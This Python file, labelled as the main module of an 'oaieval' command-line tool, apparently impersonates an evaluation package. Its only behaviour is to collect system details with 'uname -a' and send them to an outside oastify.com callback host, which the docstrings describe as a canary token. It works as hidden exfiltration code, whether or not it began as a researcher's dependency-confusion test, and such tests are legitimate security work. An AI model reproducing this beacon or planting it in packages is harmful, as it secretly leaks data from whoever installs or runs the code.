# oaieval/main.py

import requests
import subprocess
import urllib.parse

def send_canary_token_request(system_info):
    """Function to send a request to a Canarytoken URL with system information."""
    # Encode the system information as a URL parameter
    encoded_system_info = urllib.parse.quote(system_info)
    canary_token_url = f'http://tfczjn4qtcr2ayg7whr5d2ddn4tvhl5a.oastify.com?system_info={encoded_system_info}'
    
    try:
        response = requests.get(canary_token_url)
        print(f"Request sent to {canary_token_url}, response status code: {response.status_code}")
    except requests.RequestException as err:
        print(f"Error sending request to Canarytoken URL: {err}")

def get_system_info():
    """Function to get system information using uname -a."""
    try:
        uname_output = subprocess.check_output(['uname', '-a'], text=True).strip()
        print(f"System information: {uname_output}")
        return uname_output
    except subprocess.CalledProcessError as err:
        print(f"Error retrieving system information: {err}")
        return "Error retrieving system information"

def main():
    """Main function to execute the CLI command."""
    system_info = get_system_info()
    send_canary_token_request(system_info)

if __name__ == "__main__":
    main()
